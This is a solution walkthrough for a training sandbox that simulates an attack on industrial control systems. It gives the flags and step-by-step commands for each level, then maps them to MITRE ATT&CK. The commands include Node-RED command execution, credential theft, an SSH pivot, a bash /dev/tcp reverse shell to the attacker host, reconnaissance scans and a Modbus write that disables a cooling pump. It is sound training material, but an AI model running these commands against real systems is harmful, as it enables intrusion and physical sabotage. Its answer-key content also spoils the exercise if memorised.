# Complex OT Sandbox — Training Solution Walkthrough

This document provides the complete step-by-step solutions for all training levels of the **Industrial Control Hijack and Pivoting Sandbox** (`complex-operator-ot-sandbox`) training scenario. 

---

## Network Layout

| Host | Subnet | IP | Services |
|---|---|---|---|
| `attacker-host` | corporate-net | `10.10.10.50` | Kali Linux (attacker workstation) |
| `scada-hmi` | operations-net | `192.168.100.10` | Node-RED on port `1880` |
| `engineering-station` (EWS) | control-net | `192.168.20.20` | SSH (22), Modbus Client CLI |
| `openplc-node` (PLC) | control-net | `192.168.20.10` | OpenPLC Modbus Server (502) |
| `ot-gateway` | corporate-net / operations-net / control-net | `10.10.10.1` / `192.168.100.1` / `192.168.20.1` | Gateway firewall router |

### Firewall Rules (configured on `ot-gateway`)

*   Attacker (`10.10.10.50` on `corporate-net`) is allowed to connect to HMI (`192.168.100.10` on `operations-net`) via port `1880` (Node-RED).
*   Attacker is blocked from reaching EWS (`192.168.20.20`) and PLC (`192.168.20.10`) directly.
*   SCADA HMI (`192.168.100.10`) is allowed to SSH (port `22`) into EWS (`192.168.20.20`).
*   SCADA HMI is blocked from connecting to the PLC (`192.168.20.10`) directly.
*   EWS (`192.168.20.20`) is allowed to send Modbus TCP (port `502`) traffic to PLC (`192.168.20.10`).

---

## Level 1: Access the Attacker Workstation

1.  Select **`attacker-host`** on the topology graph.
2.  Click the **Web Console** link.
3.  Submit the passkey: **`start`**

---

## Level 2: SCADA HMI Compromise (Florida Oldsmar Hack)

**Objective:** Exploit the unauthenticated Node-RED interface on `scada-hmi` (`192.168.100.10:1880`) to read `/root/flag.txt` and locate EWS credentials in `/home/debian/ews_credentials.txt`.

**Answer:** `FLAG{SCADA_HMI_COMPROMISED}`

### Steps:
1.  Open the Kali web browser and go to `http://192.168.100.10:1880/`.
2.  Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
3.  Configure the `exec` node with the command: `cat /root/flag.txt`
4.  Wire them: `inject` ──► `exec` ──► `debug`.
5.  Click **Deploy** and click the trigger button on the `inject` node.
6.  Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.
7.  Change the `exec` command to `cat /home/debian/ews_credentials.txt` and trigger it to retrieve the EWS credentials:
    *   **Host:** `192.168.20.20`
    *   **User:** `operator`
    *   **Password:** `operator123`

---

## Level 3: EWS Pivot & Recon (Ukraine Power Grid)

**Objective:** Use the stolen credentials to SSH into EWS from the HMI, scan the control network, and locate the active PLC.

**Answer:** `192.168.20.10`

### Approach A: Non-Interactive (exec node via sshpass)
1.  Change the Node-RED `exec` node command to run the scan directly over SSH from the HMI:
    ```bash
    sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 "nmap -sn 192.168.20.0/24"
    ```
2.  The debug node output will list active hosts. Identify the PLC: **`192.168.20.10`**.

---

### Approach B: Interactive Reverse Shell (Recommended)

This approach establishes a full interactive terminal on the SCADA HMI back to your Kali machine, allowing you to manually SSH pivot to the EWS — closely replicating the technique used in the Ukraine Power Grid attack.

#### Step 1 — Start a Listener on Kali
On the Kali attacker host (`10.10.10.50`), open a terminal and start a TCP listener to catch the incoming shell connection:
```bash
nc -nlvp 4444
```

#### Step 2 — Deploy the Reverse Shell via Node-RED
Navigate to `http://192.168.100.10:1880/`.

1. Drag an **`inject`** node and an **`exec`** node onto the canvas and wire them together.
2. Double-click the `exec` node and enter this bash reverse shell payload into the **Command** field:
   ```bash
   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
   ```
3. Click **Deploy**, then click the inject trigger button.

#### Step 3 — Upgrade to a Full Interactive TTY
Your Kali netcat listener should receive a connection from `192.168.100.10`. You now have a root shell on the SCADA HMI. However, this is a "dumb" shell that cannot handle interactive programs like SSH password prompts. Upgrade it first:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Your prompt will change to `root@scada-hmi:~#`, confirming a fully interactive terminal.

#### Step 4 — SSH Pivot to the EWS
From the upgraded shell on the SCADA HMI, SSH into the Engineering Workstation using the credentials stolen in Level 2:
```bash
ssh operator@192.168.20.20
```
When prompted for a password, type:
```
operator123
```
*(The password will not be echoed on screen — this is standard Linux terminal behaviour.)*

#### Step 5 — Reconnaissance
You are now inside the isolated control network as `operator@engineering-station`. Discover active hosts on the control subnet:
```bash
nmap -sn 192.168.20.0/24
```
This reveals the active PLC at **`192.168.20.10`**, ready for the Modbus sabotage stage.

---

### OT Device Enumeration — Going Beyond a Ping Sweep

A ping sweep (`nmap -sn`) tells you which IP addresses are active, but not what they are. In a real /24 subnet with 200 hosts, you cannot distinguish a Windows workstation from an industrial robotic arm by host-discovery alone. Attackers move to **service and protocol enumeration** — looking for the specific ports and protocols that OT equipment speaks.

#### Method 1: Targeted ICS Port Scan (The Noisy Approach)

Industrial Control Systems use well-known dedicated ports. Instead of scanning all 65,535 ports (slow and alarm-triggering), scan exclusively for known ICS protocol ports. For a Modbus-controlled pump, target **TCP port 502**:

```bash
nmap -p 502 --open 192.168.20.0/24
```

*   **`-p 502`** — Only probe port 502.
*   **`--open`** — Only show hosts where the port is actually listening.

In this sandbox, OpenPLC is configured via its SQLite database to bind on port 502, so `192.168.20.10` is the only host that responds — instantly identifying the target.

> [!NOTE]
> Other common OT ports to scan for: `20000` (DNP3), `44818` (EtherNet/IP), `102` (Siemens S7comm), `4840` (OPC-UA).

#### Method 2: Nmap Scripting Engine (NSE) for ICS Fingerprinting

Once port 502 is confirmed open, Nmap's built-in ICS scripts can interrogate the device and extract its identity — no guessing required:

```bash
nmap -p 502 --script modbus-discover 192.168.20.0/24
```

If the PLC responds, this script returns its internal **device ID**, vendor information, and firmware version — completely unmasking the controller without any brute-force or exploit.

#### Method 3: Passive Network Sniffing (The Realistic / Safe Approach)

In real-world OT environments, active Nmap scanning is strongly discouraged. Legacy PLCs have fragile TCP/IP stacks — an aggressive scan can crash the device and halt physical production (a fast way to end a red team engagement). Instead, use passive observation from the already-compromised EWS:

```bash
sudo tcpdump -i eth0 -n port 502
```

Watching traffic for a few minutes reveals the EWS communicating with `192.168.20.10` over port 502 — confirming the PLC's identity and active protocol without sending a single aggressive probe into the control network. This "Living off the Land" technique leaves minimal forensic traces and does not risk destabilising production equipment.

---

## Level 4: Process Sabotage (Modbus Hijack)

**Objective:** Disable the cooling pump by writing `0` to Holding Register 0 on the PLC, and read the confirmation flag from `/var/log/safety_override.txt` on the EWS.

**Answer:** `FLAG{PUMP_DISABLED_SUCCESS}`

### Steps:
1.  From the EWS command environment (via the pivoted SSH shell), run the `modbus` CLI utility:
    ```bash
    modbus 192.168.20.10 0=0
    ```
2.  Read the safety log generated on the EWS:
    ```bash
    cat /var/log/safety_override.txt
    ```
3.  Copy the flag: **`FLAG{PUMP_DISABLED_SUCCESS}`**.

---

## MITRE ATT&CK Technique Mapping

This scenario covers techniques from both **MITRE ATT&CK for ICS** (the OT-specific framework) and the overlapping **MITRE ATT&CK Enterprise** framework. Each sandbox level maps to one or more real-world adversary techniques.

### ATT&CK for ICS Techniques

| Level | Tactic | Technique ID | Technique Name | Description in Scenario |
|---|---|---|---|---|
| 2 | Initial Access | **T0819** | Exploit Public-Facing Application | Attacker connects to the unauthenticated Node-RED web interface exposed on the SCADA HMI |
| 2 | Execution | **T0807** | Command and Scripting Interpreter | Bash commands executed as root via the Node-RED `exec` node |
| 2 | Collection | **T0893** | Data from Local System | Attacker reads `/home/debian/ews_credentials.txt` from the SCADA host |
| 3 | Lateral Movement | **T0859** | Valid Accounts | Stolen plaintext credentials (`operator`/`operator123`) used to authenticate to the EWS |
| 3 | Discovery | **T0846** | Remote System Discovery | `nmap -sn 192.168.20.0/24` performs host discovery across the control subnet |
| 3 | Discovery | **T0888** | Remote System Information Discovery | `nmap -p 502 --script modbus-discover` enumerates device identity from the PLC |
| 3 | Collection | **T0842** | Network Sniffing | `tcpdump -i eth0 -n port 502` passively observes Modbus traffic to identify the PLC |
| 4 | Impair Process Control | **T0855** | Unauthorized Command Message | Raw Modbus write command (`modbus 192.168.20.10 0=0`) sent to disable the cooling pump register |
| 4 | Impair Process Control | **T0831** | Manipulation of Control | Pump register forced to `0`, overriding the active process control state |

---

### ATT&CK Enterprise Techniques (IT/OT Overlap)

| Level | Tactic | Technique ID | Technique Name | Description in Scenario |
|---|---|---|---|---|
| 2 | Initial Access | **T1190** | Exploit Public-Facing Application | Unauthenticated Node-RED exposure on the Operations network |
| 2 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | Bash reverse shell spawned via Node-RED `exec` node |
| 3 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH pivot from the compromised HMI into the EWS using stolen credentials |
| 3 | Credential Access | **T1552.001** | Unsecured Credentials: Credentials In Files | Plaintext `ews_credentials.txt` discovered on the SCADA HMI filesystem |
| 3 | Discovery | **T1046** | Network Service Discovery | Nmap port scan on control subnet to identify Modbus-speaking hosts |
| 3 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | TTY upgrade via `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| 4 | Impact | **T1489** | Service Stop | Modbus write halts the cooling pump process managed by the PLC |

---

### Kill Chain Summary

```
[Initial Access]       T0819 / T1190  — Exploit unauthenticated Node-RED HMI
        │
        ▼
[Execution]            T0807 / T1059  — Command execution via exec node / reverse shell
        │
        ▼
[Collection]           T0893 / T1552  — Read plaintext credential file from SCADA host
        │
        ▼
[Lateral Movement]     T0859 / T1021  — SSH from HMI into EWS with stolen credentials
        │
        ▼
[Discovery]            T0846 / T1046  — Subnet discovery + Modbus port scan / NSE fingerprint
        │
        ▼
[Impact]               T0855 / T0831  — Unauthorized Modbus write disables cooling pump
```
